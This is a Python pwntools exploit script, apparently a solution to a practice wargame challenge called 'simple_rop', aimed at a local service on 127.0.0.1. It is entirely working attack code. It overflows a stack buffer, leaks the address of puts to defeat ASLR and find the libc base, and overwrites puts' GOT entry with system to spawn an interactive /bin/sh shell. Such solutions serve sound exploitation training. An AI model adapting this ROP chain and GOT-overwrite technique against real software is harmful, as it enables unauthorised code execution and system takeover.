from pwn import *

IP = '127.0.0.1'
PORT = 12373

#context.log_level = 'debug'

p = remote(IP, PORT)
libc = ELF('./Pwnable/aslr_nx/simple_rop/prob/libc-2.31.so')
#p = process('./Pwnable/aslr_nx/simple_rop/prob/prob')
e = ELF('./Pwnable/aslr_nx/simple_rop/prob/prob')
r = ROP(e)

p.recvuntil(b"What should I do? Enter you answer : ")

# 1. Leak vuln() Address (ret2main)
# puts(function address) -> main

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main_plt = e.symbols['main']
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

ret = pop_rdi + 1

payload = b"\x90" * 0x40
payload += b"\x90" * 8
payload += p64(ret)    # for Stack alignment
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

p.clean()

p.sendline(payload)

puts_leak = p.recvuntil(b'\n').replace(b'\n', b'') + b'\x00' * 2

puts_leak = u64(puts_leak)
print("puts_addr : ", hex(puts_leak)) # printf's got

p.recvuntil(b'What should I do? Enter you answer : \n')

# 2. libc_base leak

libc_base = puts_leak - libc.sym['puts']

print("libc_base : ", hex(libc_base))

# 3. GOT Overwrite; We will use puts

puts_got
read_plt = e.plt['read']
puts_plt = e.plt['puts']
#system_plt = e.plt['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.sym['system']

# ... and we can use libc's gadget because we already leak libcbase
pop_rdi = (ROP(libc).find_gadget(['pop rdi', 'ret']))[0] + libc_base
pop_rsi_r15 = (ROP(libc).find_gadget(['pop rsi', 'pop r15', 'ret'])[0]) + libc_base
pop_rdx = (ROP(libc).find_gadget(['pop rdx', 'pop r12', 'ret']))[0] + libc_base

ret = pop_rdi + 1

payload = b"\x90" * 0x40
payload += b"\x90" * 8

# 3.1 read(0, *puts_got, 0x10) <- *puts_got = system_plt
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(puts_got)
payload += p64(0) # dummy for r15
payload += p64(pop_rdx)
payload += p64(0x10)
payload += p64(0) # dummy for r12
payload += p64(read_plt)

# 3.2 puts("/bin/sh") -> system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(puts_plt)

p.send(payload) 

p.send(p64(system) + b'\x00' * 8)

p.interactive()